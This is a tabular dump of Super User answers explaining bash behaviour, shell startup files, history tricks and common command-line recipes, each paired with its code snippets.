,Link,Text,Code
0,https://superuser.com/questions46139/,"['source is a bash shell built-in command that executes the content of the file passed as argument, in the current shell. It has a synonym in . (period).', 'Syntax']","[<code>source</code>, <code>.</code>, <code>. filename [arguments]

source filename [arguments]
</code>]"
1,https://superuser.com/questions183870/,"[""Traditionally, when you log into a Unix system, the system would start one program for you. That program is a shell, i.e., a program designed to start other programs. It's a command line shell: you start another program by typing its name. The default shell, a Bourne shell, reads commands from ~/.profile when it is invoked as the login shell."", ""Bash is a Bourne-like shell. It reads commands from ~/.bash_profile when it is invoked as the login shell, and if that file doesn't exist¹, it tries reading ~/.profile instead."", ""You can invoke a shell directly at any time, for example by launching a terminal emulator inside a GUI environment. If the shell is not a login shell, it doesn't read ~/.profile. When you start bash as an interactive shell (i.e., not to run a script), it reads ~/.bashrc (except when invoked as a login shell, then it only reads ~/.bash_profile or ~/.profile."", 'Therefore:', '~/.profile is the place to put stuff that applies to your whole session, such as programs that you want to start when you log in (but not graphical programs, they go into a different file), and environment variable definitions.', '~/.bashrc is the place to put stuff that applies only to bash itself, such as alias and function definitions, shell options, and prompt settings. (You could also put key bindings there, but for bash they normally go into ~/.inputrc.)', ""~/.bash_profile can be used instead of ~/.profile, but it is read by bash only, not by any other shell. (This is mostly a concern if you want your initialization files to work on multiple machines and your login shell isn't bash on all of them.) This is a logical place to include ~/.bashrc if the shell is interactive. I recommend the following contents in ~/.bash_profile:"", ""On modern unices, there's an added complication related to ~/.profile. If you log in in a graphical environment (that is, if the program where you type your password is running in graphics mode), you don't automatically get a login shell that reads ~/.profile. Depending on the graphical login program, on the window manager or desktop environment you run afterwards, and on how your distribution configured these programs, your ~/.profile may or may not be read. If it's not, there's usually another place where you can define environment variables and programs to launch when you log in, but there is unfortunately no standard location."", 'Note that you may see here and there recommendations to either put environment variable definitions in ~/.bashrc or always launch login shells in terminals. Both are bad ideas. The most common problem with either of these ideas is that your environment variables will only be set in programs launched via the terminal, not in programs started directly with an icon or menu or keyboard shortcut.', ""¹  For completeness, by request: if .bash_profile doesn't exist, bash also tries .bash_login before falling back to .profile. Feel free to forget it exists.  ""]","[<code>~/.profile</code>, <code>~/.bash_profile</code>, <code>~/.profile</code>, <code>~/.profile</code>, <code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>~/.profile</code>, <code>~/.profile</code>, <code>~/.bashrc</code>, <code>~/.inputrc</code>, <code>~/.bash_profile</code>, <code>~/.profile</code>, <code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>if [ -r ~/.profile ]; then . ~/.profile; fi
case ""$-"" in *i*) if [ -r ~/.bashrc ]; then . ~/.bashrc; fi;; esac
</code>, <code>~/.profile</code>, <code>~/.profile</code>, <code>~/.profile</code>, <code>~/.bashrc</code>, <code>.bash_profile</code>, <code>.bash_login</code>, <code>.profile</code>]"
2,https://superuser.com/questions176783/,"['Sourcing a script will run the commands in the current shell process. ', 'Executing a script will run the commands in a new shell process. ', 'Use source if you want the script to change the environment in your currently running shell. use execute otherwise.', 'If you are still confused, please read on. ', 'To clarify some common confusion about the syntax to execute and the syntax to source:', 'This will execute myscript provided that the file is executable and located in the current directory. The leading dot and slash (./) denotes the current directory. This is necessary because the current directory is usually not (and usually should not be) in $PATH.', 'This will execute myscript if the file is executable and located in some directory in $PATH.', 'This will source myscript. The file need not be executable but it must be a valid shell script. The file can be in current directory or in a directory in $PATH.', 'This will also source myscript. This ""spelling"" is the official one as defined by POSIX. Bash defined source as an alias to the dot.', 'Consider myscript.sh with following content:', 'Before we execute the script first we check the current environment:', 'The variable FOO is not defined and we are in the home directory.', 'Now we execute the file:', 'Check the environment again:', 'The variable FOO is not set and the working directory did not change.', 'The script output clearly shows that the variable was set and the directory was changed. The check afterwards show that the variable is not set and the directory not changed. What happened? The changes were made in a new shell. The current shell spawned a new shell to run the script. The script is running in the new shell and all changes to the environment take effect in the new shell. After the script is done the new shell is destroyed. All changes to the environment in the new shell are destroyed with the new shell. Only the output text is printed in the current shell.', 'Now we source the file:', 'Check the environment again:', 'The variable FOO is set and the working directory has changed.', 'Sourcing the script does not create a new shell. All commands are run in the current shell and changes to the environment take effect in the current shell.', 'Note that in this simple example the output of executing is the same as sourcing the script. This is not necessarily always the case.', 'Consider following script pid.sh:', '(the special variable $$ expands to the PID of the current running shell process)', 'First print the PID of the current shell:', 'Source the script:', 'Execute the script, note the PID:', 'Source again:', 'Execute again:', 'You can see that sourcing the script runs in the same process while executing the script creates a new process everytime. That new process is the new shell which was created for the execution of the script. Sourcing the script does not create a new shell and thus the PID stays the same.', 'Both sourcing and executing the script will run the commands in the script line by line, as if you typed those commands by hand line by line.', 'The differences are:', 'Use source if you want the script to change the environment in your currently running shell. use execute otherwise.', 'See also:']","[<code>./myscript
</code>, <code>myscript</code>, <code>./</code>, <code>$PATH</code>, <code>myscript
</code>, <code>myscript</code>, <code>$PATH</code>, <code>source myscript
</code>, <code>myscript</code>, <code>$PATH</code>, <code>. myscript
</code>, <code>myscript</code>, <code>source</code>, <code>myscript.sh</code>, <code>#!/bin/sh
# demonstrate setting a variable
echo ""foo: ""$(env | grep FOO)
export FOO=foo
echo ""foo: ""$(env | grep FOO)
# demonstrate changing of working directory
echo ""PWD: ""$PWD
cd somedir
echo ""PWD: ""$PWD
</code>, <code>$ env | grep FOO
$ echo $PWD
/home/lesmana
</code>, <code>FOO</code>, <code>$ ./myscript.sh
foo:
foo: FOO=foo
PWD: /home/lesmana
PWD: /home/lesmana/somedir
</code>, <code>$ env | grep FOO
$ echo $PWD
/home/lesmana
</code>, <code>FOO</code>, <code>$ source myscript.sh
foo:
foo: FOO=foo
PWD: /home/lesmana
PWD: /home/lesmana/somedir
</code>, <code>$ env | grep FOO
FOO=foo
$ echo $PWD
/home/lesmana/somedir
</code>, <code>pid.sh</code>, <code>#!/bin/sh
echo $$
</code>, <code>$$</code>, <code>$ echo $$
25009
</code>, <code>$ source pid.sh
25009
</code>, <code>$ ./pid.sh
25011
</code>, <code>$ source pid.sh
25009
</code>, <code>$ ./pid.sh
25013
</code>]"
3,https://superuser.com/questions246837/,"['Linux :', 'or', 'or', 'Mac os x :', 'or', 'or']","[<code>echo 'task goes here' | cat - todo.txt &gt; temp &amp;&amp; mv temp todo.txt
</code>, <code>sed -i '1s/^/task goes here\n/' todo.txt
</code>, <code>sed -i '1itask goes here' todo.txt
</code>, <code>sed -i '.bak' '1s/^/task goes here\'$'\n/g' todo.txt
</code>, <code>echo -e ""task goes here\n$(cat todo.txt)"" &gt; todo.txt
</code>, <code>echo 'task goes here' | cat - todo.txt &gt; temp &amp;&amp; mv temp todo.txt
</code>]"
4,https://superuser.com/questions7414/,"['Type Ctrl R at the command line and start typing the previous command.  Once a result appears keep hitting Ctrl R to see other matches.  When the command you want appears, simply press Enter', 'Note that while Ctrl R is the default, if you wanted the command (reverse-search-history) to be bound to Ctrl T you could configure that with the following:', 'There are a whole host of other readline bindable commands that are available to you as well.  Take a look at the bash man page.', 'Bash has many facilities to search and access interactive command history.  The most basic of which is the history builtin.  Typing just:', 'Will print a list of commands along with a numeric index, like:', 'You can then execute any of these commands using their numeric index by prefacing the index with a single !, as Mitch pointed out:', 'Will execute the clear command.  The history builtin has many features itself, you can see more in the bash and history man pages.', 'You can also specify relative negative offsets when using the ! designator, so using our history list above, if we wanted to execute vim again, we could do:', 'Which is basically telling bash to execute the command you ran ""two commands ago.""  To run the previous command in the history list, we can just use !! (which is just shorthand for !-1).', ""The ! designator doesn't limit you to numerically specifying which command to run. hayalci showed that you can instruct bash to execute a command based on either the text it begins with (using !) or text within the command itself (using !?).  Again, using our example history list above, if we wanted to execute clear again, all we need to do is type:"", 'and press Enter.  And what about vim?  That is as simple as:', ""The most important point from hayalci's response is the call to the shopt builtin:"", 'This will enable history verification so that commands that are matched by the !, !!, and !? designators are not blindly executed, but instead filled in on the command line so you can ensure they will do no evil before executing them.  This is even more important when you are executing commands as the root user.  This option can be set in your .bashrc startup file so that it is set whenever you log in.', 'As has already been pointed out, all of this information can be gleaned from the bash man page.  For the !, !!, and !? designators, take a look at Section 9.3 History Expansion.']","[<code>reverse-search-history</code>, <code>bash</code>, <code>history</code>, <code>!</code>, <code>clear</code>, <code>bash</code>, <code>history</code>, <code>!</code>, <code>vim</code>, <code>!!</code>, <code>!-1</code>, <code>!</code>, <code>bash</code>, <code>!</code>, <code>!?</code>, <code>clear</code>, <code>vim</code>, <code>shopt</code>, <code>!</code>, <code>!!</code>, <code>!?</code>, <code>.bashrc</code>, <code>bash</code>]"
5,https://superuser.com/questions113219/,"['cd - (goes back to previous directory)', 'If you want to be able to go to the other previous directories, this is not possible out of the box. But check this script and instructions:', 'History of visited directories in BASH', 'The cd command works as usual. The new\n  feature is the history of the last 10\n  directories and the cd command\n  expanded to display and access it. cd\n  -- (or simply pressing ctrl+w) shows the history. In front of every\n  directory name you see a number. cd\n  -num with the number you want jumps to the corresponding directory from the\n  history.']",[<code>cd -</code>]
6,https://superuser.com/questions284187/,"[""With bash, if you want to embed newlines in a string, enclose the string with $'':"", 'And if you have such a string already in a variable, you can read it line-by-line with:']","[<code>$''</code>, <code>$ list=""One\ntwo\nthree\nfour""
$ echo ""$list""
One\ntwo\nthree\nfour
$ list=$'One\ntwo\nthree\nfour'
$ echo ""$list""
One
two
three
four
</code>, <code>while IFS= read -r line; do
    echo ""... $line ...""
done &lt;&lt;&lt; ""$list""
</code>]"
7,https://superuser.com/questions133780/,['Since you do not depend on bash to expand variables in your commit message you could use single quotes instead. Strings in single quotes are not expanded by bash.'],"[<code>bzr commit -m 'This does work!' 
</code>]"
8,https://superuser.com/questions140461/,['Surround the command with quotes'],"[<code>watch -n 1 'tail -n 200 log/site_dev.log | fgrep Doctrine'
</code>]"
9,https://superuser.com/questions421463/,"['In the days of physical terminals, session-wide clipboards did not exist, only few programs supported internal copy/paste – often under the name of ""buffers"" or ""kill rings"" – and used various different keystrokes. For example, the bash shell uses CtrlK or CtrlU to ""kill"" (cut), CtrlY to ""yank"" (paste); this comes from the emacs editor.', 'CtrlC almost everywhere in Unix was the ""interrupt"" key, used to cancel the current program or operation. The CtrlV key often meant ""verbatim insert"" – that is, insert the following character literally without performing any associated action. For example, a normal Esc switches to command mode in the vi editor, but CtrlV, Esc will insert the ESC character into the document.', 'The use of CtrlC to copy and CtrlV to paste from session-wide clipboard was introduced by Mac OS in 1983 and Microsoft Windows 3.x in 1990. (Earlier Windows versions (1.x and 2.x), as well as IBM OS/2, only supported the IBM CUA keys CtrlIns to copy and ShiftIns to paste; these shortcuts remain supported by all Windows versions.)', 'When GUIs with clipboard support finally reached Unix, the Ctrl keypresses were already in use by many terminal programs. In addition, the X graphical interface had somewhat different mechanisms: ""selections"" and ""cut buffers"". Even now you can select text in one program and insert it using the middle mouse button, without any explicit copy action.', 'In short, by the time Xterm and GNOME Terminal were written (I\'m guessing you use the latter), CtrlV already had a completely different meaning for many years and could not be changed. In addition, an alternative method of copying text – the ""selection"" – was already present in X11, so explicit copy/paste action was probably considered not as important as it would be in Windows. This means that different keyboard shortcuts had to be selected – for example, most modern terminal programs, like GNOME Terminal, use CtrlShiftC and CtrlShiftV. (If you use Xterm, the same shortcuts can be added manually using the XTerm*vt100*translations Xresource. Rxvt does not have such an option.)', '(Most X11 toolkits also support the CUA ""copy"" and ""paste"" keys, which do not conflict with terminal programs. Unfortunately, the implementations are rather inconsistent – CtrlIns copies to the ""clipboard"" in most programs (GTK, Qt4, but ignored by Xaw); however, ShiftIns pastes from the ""primary selection"" in most GTK and Qt4 programs, but from ""clipboard"" in Firefox, and from the now-obsolete cut-buffers in the now-obsolete Xaw.)', 'All that said, some terminals or consoles (in particular, the Windows 10 console) do support these keys. As the Windows console always had a separate ""mark/select"" mode, CtrlC now also has two meanings based on context – in regular mode it sends an interrupt, in select mode it copies to clipboard (just like Enter used to).', 'Meanwhile, Windows command-line tools never really used CtrlV for anything, so it was bound to ""paste"" without disturbing much anything. Doing the same on Unix-like terminals however would be more problematic.']",[<code>ESC</code>]
10,https://superuser.com/questions736635/,"[""You can remove just the offending line from bash's history, instead of clearing the entire history. Simply remove the line with the -d flag, then save (write) the new history with the -w flag:""]","[<code>bash</code>, <code>-d</code>, <code>-w</code>, <code>$ history
351 ssh me@site.com
352 my_password
$ history -d 352
$ history -w
</code>]"
11,https://superuser.com/questions243460/,"['To understand the problem of why Ctrl + C does not work, it is very helpful to understand what happens when you press it:', 'Most shells bind Ctrl + C to ""send a SIGINT signal to the program that currently runs in the foreground"". You can read about the different signals via man signal:', 'Programs can ignore that signal, as they can ignore SIGTSTP as well:', '(Which is what most shells do when you press Ctrl + Z, which is why it is not guaranteed to work.)', 'There are some signals which can not be ignored by the process: SIGKILL, SIGSTOP and some others. You can send these signals via the kill command. So, to kill your hanging / zombieying process, just find the process ID (PID). For example, use pgrep or ps and then kill it:']","[<code> SIGINT        2       Term    Interrupt from keyboard
</code>, <code> SIGTSTP   18,20,24    Stop    Stop typed at tty
</code>, <code>pgrep</code>, <code>ps</code>, <code>kill</code>, <code> % kill -9 PID
</code>]"
12,https://superuser.com/questions173165/,"['It stands for “run commands”.', 'This comes from MIT’s CTSS (Compatible Time-Sharing System) and Multics, where the idea that a command processing shell would be an ordinary program originated. CTSS had a program called RUNCOM (for “run commands”) and a script was called “a runcom” in the community where Unix originated, leading to the file extension .rc and generally to the rc abbreviation.', 'rc stuck as a name for any list of commands.']","[<code>.rc</code>, <code>rc</code>, <code>rc</code>]"
13,https://superuser.com/questions1066261/,"[""You'll find the Windows C:\\ structure at /mnt/c/ in the Bash environment."", 'Therefore, my Documents folder is at /mnt/c/Users/Ben/Documents/.']","[<code>C:\</code>, <code>/mnt/c/</code>, <code>/mnt/c/Users/Ben/Documents/</code>]"
14,https://superuser.com/questions289239/,"['You are probably looking for some combination of messages from various log files. Try:', '…to get a pretty good overview of the system. If you want more or less than that, research what log file the messages you want to see are being placed in.', 'Also look into using multitail to file and color code and filter multiple log files at once.', ""Edit: This wasn't very relevant when I answered this, but as this page gets a lot of hits I'm thought it worth mentioning that newer systems running systemd have this.""]","[<code>tail -f /var/log/{messages,kernel,dmesg,syslog}
</code>, <code>multitail</code>, <code>dmesg -w
</code>]"
15,https://superuser.com/questions384366/,"['You need to log out and back in or run history -a so the current history is committed to disk.', 'Then just edit the file ~/.bash_history.']","[<code>history -a</code>, <code>~/.bash_history</code>]"
16,https://superuser.com/questions508507/,"['All you should need to do is add ""\\"" at the end of each line and it should be good to go.', 'So yours will look like:', '(based on your comment update for setting $HOSTNAME)', '$HOSTNAME', 'Two options to set that:', 'Set HOSTNAME', 'HOSTNAME=$(hostname)', 'Use command substitution (e.g. $(command))', 'So it would look like above.  That just makes the command run before using it.', '$DATE', 'Another variable avoided would be easily:', '$ man date will have the formats for the date options, the above is YYYYmmdd']","[<code>tar -cvpzf /share/Recovery/Snapshots/$(hostname)_$(date +%Y%m%d).tar.gz \
    --exclude=/proc \
    --exclude=/lost+found \
    --exclude=/sys \
    --exclude=/mnt \
    --exclude=/media \ 
    --exclude=/dev \
    --exclude=/share/Archive \
    /
</code>, <code>$HOSTNAME</code>, <code>$(command)</code>, <code>$DATE</code>, <code>$(hostname)_$(date +%Y%m%d).tar.gz \
</code>, <code>$ man date</code>]"
17,https://superuser.com/questions397307/,"['You can use the negate (!) feature of find to not match files with specific names:', 'So if the name ends in .html or contains .svn anywhere in the path, it will not match, and so the exec will not be executed.']","[<code>find . ! -name '*.html' ! -path '*.svn*' -exec grep 'SearchString' {} /dev/null \;
</code>]"
18,https://superuser.com/questions271986/,"['This is often the best way:', 'or', ""It's pretty short and easy to type. It does start a sub-shell, so you can't modify your environment from that, but that doesn't seem to be an issue here.""]","[<code>( cd dir ; git init )
</code>, <code>( cd dir &amp;&amp; git init )
</code>]"
19,https://superuser.com/questions90196/,"['Update the text in /etc/inputrc to include', 'Then use ^X ^R to reload the configuration.']","[<code>/etc/inputrc</code>, <code>^X ^R</code>]"
20,https://superuser.com/questions69130/,"['When bash starts it reads the following files every time you login. For the purposes of OS X, this means every time you open a new Terminal window.', 'When you start a new shell by typing bash on the command line, it reads .bashrc', 'OS X also uses ~/.MacOSX/environment.plist to set more environment variables, including paths if necessary.', 'Finally, /etc/paths and /etc/paths.d are read by the shell too.', '/opt/local/bin etc. are added in ~/.tcshrc by MacPorts. Also be sure to look in ~/.cshrc.']","[<code>bash</code>, <code>Terminal</code>, <code>/etc/profile
~/.bash_profile
~/.bash_login   (if .bash_profile does not exist)
~/.profile      (if .bash_login does not exist)
</code>, <code>bash</code>, <code>.bashrc</code>, <code>~/.MacOSX/environment.plist</code>, <code>/etc/paths</code>, <code>/etc/paths.d</code>, <code>/opt/local/bin</code>, <code>~/.tcshrc</code>, <code>~/.cshrc</code>]"
21,https://superuser.com/questions39751/,"['From my .bashrc:', 'Note that PATH should already be marked as exported, so reexporting is not needed.  This checks whether the directory exists & is a directory before adding it, which you may not care about.', 'Also, this adds the new directory to the end of the path; to put at the beginning, use PATH=""$1${PATH:+"":$PATH""}"" instead of the above PATH= line.']","[<code>pathadd() {
    if [ -d ""$1"" ] &amp;&amp; [[ "":$PATH:"" != *"":$1:""* ]]; then
        PATH=""${PATH:+""$PATH:""}$1""
    fi
}
</code>, <code>PATH=""$1${PATH:+"":$PATH""}""</code>, <code>PATH=</code>]"
22,https://superuser.com/questions105375/,"['The Bash documentation states ""For almost every purpose, shell functions are preferred over aliases."" Here is a shell function that replaces ls and causes output to be piped to more if the argument consists of (only) -la.', 'As a one-liner:', 'Automatically pipe output:']","[<code>ls</code>, <code>more</code>, <code>-la</code>, <code>ls() {
    if [[ $@ == ""-la"" ]]; then
        command ls -la | more
    else
        command ls ""$@""
    fi
}
</code>, <code>ls() { if [[ $@ == ""-la"" ]]; then command ls -la | more; else command ls ""$@""; fi; }
</code>, <code>ls -la
</code>]"
23,https://superuser.com/questions94436/,"['Change the Terminal-type String under the Connection > Data tab from the default “xterm” to “linux”. It worked for me.', '']",[]
24,https://superuser.com/questions529854/,"['What I do in those cases is to type', 'Then I press Ctrl+X,* to expand * into all visible file names.', 'Then I can just remove the two files I like to keep from the list and finally execute the command line.']","[<code>rm *
</code>, <code>*</code>]"
25,https://superuser.com/questions352289/,"['Also, it would be cool to check if the directory exists before.']","[<code>if [ -z ""$(ls -A /path/to/dir)"" ]; then
   echo ""Empty""
else
   echo ""Not Empty""
fi
</code>]"
26,https://superuser.com/questions46748/,"['Use:', 'Enter your password and state the path to the shell you want to use.', 'For Bash that would be /bin/bash.\nFor Zsh that would be /usr/bin/zsh.']","[<code>chsh
</code>, <code>/bin/bash</code>, <code>/usr/bin/zsh</code>]"
27,https://superuser.com/questions175799/,"['Not natively, but it can be hacked up using the DEBUG trap. This code sets up preexec and precmd functions similar to zsh. The command line is passed as a single argument to preexec.', 'Here is a simplified version of the code to set up a precmd function that is executed before running each command.', 'This trick is due to Glyph Lefkowitz; thanks to bcat for locating the original author.', ""Edit. An updated version of Glyph's hack can be found here: https://github.com/rcaloras/bash-preexec""]","[<code>DEBUG</code>, <code>preexec</code>, <code>precmd</code>, <code>preexec</code>, <code>precmd</code>, <code>preexec () { :; }
preexec_invoke_exec () {
    [ -n ""$COMP_LINE"" ] &amp;&amp; return  # do nothing if completing
    [ ""$BASH_COMMAND"" = ""$PROMPT_COMMAND"" ] &amp;&amp; return # don't cause a preexec for $PROMPT_COMMAND
    local this_command=`HISTTIMEFORMAT= history 1 | sed -e ""s/^[ ]*[0-9]*[ ]*//""`;
    preexec ""$this_command""
}
trap 'preexec_invoke_exec' DEBUG
</code>]"
28,https://superuser.com/questions454380/,"[""There are a number of ways this can be done in ConEmu as it is so highly configurable, but here's the way I do it."", '', '', ""This should add an entry in your right-click context menu (complete with icon). In the Command field you can use any of the ConEmu.exe switches (worth checking out for more complete documentation of what you can do - it's pretty powerful)."", ""Note: If you'd like a Git for Windows icon to appear at the top left of the ConEmu window, use the /icon switch; e.g.,"", ""This only seems to work if it's the first tab open, though.""]","[<code>Git Bash</code>, <code>""C:\Program Files\Git\bin\sh.exe"" --login -i</code>, <code>ConEmu Here [Git Bash]</code>, <code>/single /cmd {Git Bash}</code>, <code>C:\Program Files\Git\mingw64\share\git\git-for-windows.ico</code>, <code>/icon</code>, <code>/icon ""C:\Program Files\Git\mingw64\share\git\git-for-windows.ico"" /single /cmd {Git Bash}
</code>]"
29,https://superuser.com/questions1111591/,"[""I got it to work; here's how."", ""Uninstalled ssh-server, reinstalled it and made sure it's started with"", 'Make sure you turned off root access and added another user in the config file.', 'I was able to connect to the subsystem on 127.0.0.1:22 as expected.\xa0\nI hope this will help you.', '', 'Then add a line beneath it that says:', 'AllowUsers yourusername', 'and make sure PasswordAuthentication is set to yes if you want to login using a password.', 'Disable privilege separation by adding/modifying : UsePrivilegeSeparation no', 'sudo service ssh --full-restart', 'Connect to your Linux subsystem from Windows using a ssh client like PuTTY.']","[<code>sudo service ssh --full-restart
</code>, <code>sudo apt-get purge openssh-server</code>, <code>sudo apt-get install openssh-server</code>, <code>sudo nano /etc/ssh/sshd_config</code>, <code>PermitRootLogin no</code>, <code>AllowUsers yourusername</code>, <code>PasswordAuthentication</code>, <code>yes</code>, <code>UsePrivilegeSeparation no</code>, <code>sudo service ssh --full-restart</code>]"
30,https://superuser.com/questions31464/,"['Edited not to use ls where a glob would do, as @shawn-j-goff and others suggested.', 'Just use a for..do..done loop:', 'You can replace the * with *.txt or any other glob that returns a list (of files, directories, or anything for that matter), a command that generates a list, e.g., $(cat filelist.txt), or actually replace it with a list.', 'Within the do loop, you just refer to the loop variable with the dollar sign prefix (so $f in the above example). You can echo it or do anything else to it you want.', 'For example, to rename all the .xml files in the current directory to .txt:', 'Or even better, if you are using Bash you can use Bash parameter expansions rather than spawning a subshell:']","[<code>for..do..done</code>, <code>for f in *; do
  echo ""File -&gt; $f""
done
</code>, <code>*</code>, <code>*.txt</code>, <code>$(cat filelist.txt)</code>, <code>do</code>, <code>$f</code>, <code>echo</code>, <code>.xml</code>, <code>.txt</code>, <code>for x in *.xml; do 
  t=$(echo $x | sed 's/\.xml$/.txt/'); 
  mv $x $t &amp;&amp; echo ""moved $x -&gt; $t""
done
</code>, <code>for x in *.xml; do 
  t=${x%.xml}.txt
  mv $x $t &amp;&amp; echo ""moved $x -&gt; $t""
done
</code>]"
31,https://superuser.com/questions554319/,"['You probably want to see the directories ordered by size:', '$ du -hs * | sort -hr']","[<code>$ du -hs * | sort -hr</code>, <code>856M    lib
746M    share
612M    lib64
312M    src
267M    java
239M    bin
179M    sbin
173M    local
93M     i686-w64-mingw32
72M     libexec
26M     include
20M     puppet
772K    X11R6
20K     man
4.0K    games
4.0K    etc
0       tmp
</code>]"
32,https://superuser.com/questions1083962/,"[""I'm not sure if I'm misunderstanding your question, but your ubuntu bash (top right window) should have access to your Windows-based disks under /mnt.  For example, on my machine /mnt/c/Users/Scott/Desktop is my Windows desktop and I can read/write files there from vi for ex.  I don't believe the opposite is true just yet.  That is, I don't think you can explore into your bash world from Windows explorer."", ""What I've been doing as a developer is to host projects on my d: and point the linux-based tools to that /mnt/d/projects/someproject/ folder."", 'Make sure you update your Windows builds periodically as they seem to be fixing a lot of issues with each build, especially around sym-links and crossing FS boundaries between Linux/Windows.']","[<code>/mnt</code>, <code>/mnt/c/Users/Scott/Desktop</code>, <code>/mnt/d/projects/someproject/</code>]"
33,https://superuser.com/questions1065569/,"['The following answer only applies to WSL on Windows 10 1703 and 1607. WSL on Windows 10 1709+ can be installed from within the Windows Store UWP application.', 'If you want to remove and reset the Linux subsystem, open a command line prompt with elevated permissions and enter the following commands:', 'Sources:', 'https://www.slightfuture.com/technote/lxss-lxrun', 'Installing Fish Shell on Ubuntu on Windows 10', 'HOWTO: Ubuntu on Windows | Ubuntu Insights']","[<code>lxrun /uninstall /full 

lxrun /install
</code>]"
34,https://superuser.com/questions241187/,"['By default, C-x C-r is bound to re-read-init-file.', 'See the Bash Reference Manual for explanation.']","[<code>C-x C-r</code>, <code>re-read-init-file</code>]"
35,https://superuser.com/questions153371/,"['From man bash:', 'ENVIRONMENT', 'When a program is invoked it is given an array of strings called the\n  environment.  This is a list of\n  name-value pairs, of the form\n  name=value.', ""The shell provides several ways to manipulate the environment.  On\n  invocation, the shell  scans  its own \n  environment and creates a parameter\n  for each name found, automatically\n  marking it for export to child\n  processes.  Executed commands inherit\n  the environment.  The export  and \n  declare  -x  commands allow \n  parameters  and functions to be added\n  to and deleted from the environment. \n  If the value of a parameter in the\n  environment is modified, the new value\n  becomes part of the  environment, \n  replacing the old.  The environment\n  inherited by any executed command\n  consists of the shell's initial\n  environment, whose values may be\n  modified in the shell, less any pairs\n  removed by the unset  command,  plus\n  any additions via the export and\n  declare -x commands.""]","[<code>man bash</code>, <code>export</code>, <code>declare  -x</code>, <code>unset</code>, <code>declare -x</code>]"
36,https://superuser.com/questions421153/,"['Pipe?', ""Won't leave any trace.""]","[<code>lame --decode music.mp3 - | play -
</code>]"
37,https://superuser.com/questions281617/,"['The crontab -e command will check the environment variables $EDITOR and $VISUAL for an override of the default text editor, so...', 'or ', 'should do the trick.']","[<code>crontab -e</code>, <code>$EDITOR</code>, <code>$VISUAL</code>, <code>export VISUAL=vim
</code>, <code>export EDITOR=vim
</code>]"
38,https://superuser.com/questions428493/,"['This command will do it (tested on both Mac OS X Lion and Kubuntu Linux).', ""Here's how it works:"", ""Note that the 'without a backup' part in line 4 is OK for me, because the files I'm changing are under version control anyway, so I can easily undo if there was a mistake."", 'To avoid having to remember this, I use an interactive bash script, as follows:']","[<code># Recursively find and replace in files
find . -type f -name ""*.txt"" -print0 | xargs -0 sed -i '' -e 's/foo/bar/g'
</code>, <code>find . -type f -name '*.txt'</code>, <code>.</code>, <code>-type f</code>, <code>.txt</code>, <code>|</code>, <code>xargs</code>, <code>sed</code>, <code>sed -i '' -e 's/foo/bar/g'</code>, <code>s/foo/bar</code>, <code>/g</code>, <code>man sed</code>, <code>#!/bin/bash
# find_and_replace.sh

echo ""Find and replace in current directory!""
echo ""File pattern to look for? (eg '*.txt')""
read filepattern
echo ""Existing string?""
read existing
echo ""Replacement string?""
read replacement
echo ""Replacing all occurences of $existing with $replacement in files matching $filepattern""

find . -type f -name $filepattern -print0 | xargs -0 sed -i '' -e ""s/$existing/$replacement/g""
</code>]"
39,https://superuser.com/questions9181/,"['Remove the trailing slash:', 'With prompt:', '$ rm test5', 'Without prompt:', '$ rm -f test5']","[<code>$ rm test5</code>, <code>$ rm -f test5</code>]"
40,https://superuser.com/questions189362/,"['There is a distinction between command line arguments and standard input.  A pipe will connect standard output of one process to standard input of another.  So', 'Connects standard output of ls to standard input of echo.  Fine right?  Well, echo ignores standard input and will dump its command line arguments - which are none in this case to - its own stdout. The output: nothing at all.', 'There are a few solutions in this case.  One is to use a command that reads stdin and dumps to stdout, such as cat.', ""Will 'work', depending on what your definition of work is.  "", 'But what about the general case. What you really want is to convert stdout of one command to command line args of another.  As others have said, xargs is the canonical helper tool in this case, reading its command line args for a command from its stdin, and constructing commands to run.', 'You could also convert this some, using the substitution command $()', 'Would also do what you want.', 'Both of these tools are pretty core to shell scripting, you should learn both.  ', 'For completeness, as you indicate in the question, the other base way to convert stdin to command line args is the shell\'s builtin read command. It converts ""words"" (words as defined by the IFS variable) to a temp variable, which you can use in any command runs.']","[<code>ls | echo
</code>, <code>ls | cat
</code>, <code>xargs</code>, <code>ls | xargs echo
</code>, <code>$()</code>, <code>echo $(ls)
</code>, <code>read</code>, <code>IFS</code>]"
41,https://superuser.com/questions60555/,"['Change the \\w (lowercase) to \\W (uppercase):', 'Have a look at the Bash Prompt HOWTO for lots of fun details.  example:', 'The PROMPT_COMMAND variable, if set, is a command that gets run before displaying the prompt specified in PS1.  In your case, PROMPT_COMMAND runs an echo statement with certain ANSI escape sequences that manipulate the titlebar of an Xterm.', 'If you suspect your PROMPT_COMMAND is overriding your PS1 prompt, you can unset it and test things out:', ""Finally, be sure that you're changing the PS1 definition that actually gets used.  Common locations are /etc/bash.bashrc, /etc/profile, ~/.bashrc, ~/.bash_profile, ~/.profile.  The system files are generally (but not always) run before the user files.""]","[<code>\w</code>, <code>\W</code>, <code>PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\W\[\033[00m\]\$ '
                                                                                       ^^
           this one waaaaaay over here ------------------------------------------------+    
</code>, <code>user@host:/usr/local/bin$ echo $PS1
${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\w\[\033[00m\]\$ 

user@host:/usr/local/bin$ export PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\W\[\033[00m\]\$ '

user@host:bin$
</code>, <code>PROMPT_COMMAND</code>, <code>PS1</code>, <code>PROMPT_COMMAND</code>, <code>echo</code>, <code>PROMPT_COMMAND</code>, <code>PS1</code>, <code>unset</code>, <code>$ unset PROMPT_COMMAND
</code>, <code>PS1</code>, <code>/etc/bash.bashrc</code>, <code>/etc/profile</code>, <code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>~/.profile</code>]"
42,https://superuser.com/questions290908/,"['On my system, man less says', 'Works for me!']",[<code>man less</code>]
43,https://superuser.com/questions484277/,"['You can use eval:', ""But see Andrew's comment and glenn's reply below.""]","[<code>eval</code>, <code>eval echo ~$USER
</code>]"
44,https://superuser.com/questions974714/,"['Got it! Somehow I\'d accidentally turned ""Automatically Mark Prompt Lines"" on:', '', 'I do wonder though where that configuration is stored on disk, as I also tried:']",[<code>~/Library/Preferences/com.apple.Terminal.plist</code>]
